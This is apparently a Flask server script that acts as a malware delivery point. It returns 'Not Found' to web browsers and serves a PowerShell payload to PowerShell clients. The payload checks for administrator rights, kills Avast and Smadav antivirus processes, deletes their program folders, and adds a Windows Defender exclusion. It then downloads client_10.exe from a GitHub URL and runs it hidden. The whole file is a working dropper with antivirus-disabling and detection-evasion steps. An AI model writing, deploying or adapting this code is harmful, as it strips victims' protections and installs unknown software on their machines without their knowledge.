from flask import Flask, Response, request
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    # 1. STEALTH CHECK: Identify the visitor
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # If the visitor is a browser (Chrome, Edge, etc.), pretend the page doesn't exist
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404, mimetype='text/plain')

    # 2. THE PAYLOAD: PowerShell script with Process Killing logic
    ps_content = """
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- JAILBREAK-1: ADMIN ACTIVE ---" -ForegroundColor Green
    Write-Host "Cleaning environment and stopping background processes..." -ForegroundColor Cyan
    
    # List of process names to kill (without .exe)
    $procsToKill = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")

    foreach ($proc in $procsToKill) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            Write-Host "Stopping..." -ForegroundColor Yellow
            Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        }
    }

    # Define folders to clean up
    $targetFolders = @(
        "C:\\Program Files\\Avast Software",
        "C:\\Program Files (x86)\\SMADAV",
        "C:\\Program Files\\SMADAV"
    )

    foreach ($folder in $targetFolders) {
        if (Test-Path -Path $folder) {
            Write-Host "rem..." -ForegroundColor Cyan
            Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # Top-Followers Deployment
    $filePath = "$HOME\\client_10.exe"
    
    # Add exclusion so Windows Defender doesn't block it
    Add-MpPreference -ExclusionPath $filePath

    if (-not (Test-Path $filePath)) {
        Write-Host "Downloading latest components..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath
    }

    if (Test-Path $filePath) {
        Write-Host "Starting..." -ForegroundColor Green
        Start-Process $filePath -WindowStyle Hidden
    }
    
} else {
    Write-Host "--- ACCESS DENIED ---" -ForegroundColor Red
    Write-Host "Please run PowerShell as Administrator." -ForegroundColor Yellow
}
"""
    return Response(ps_content, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
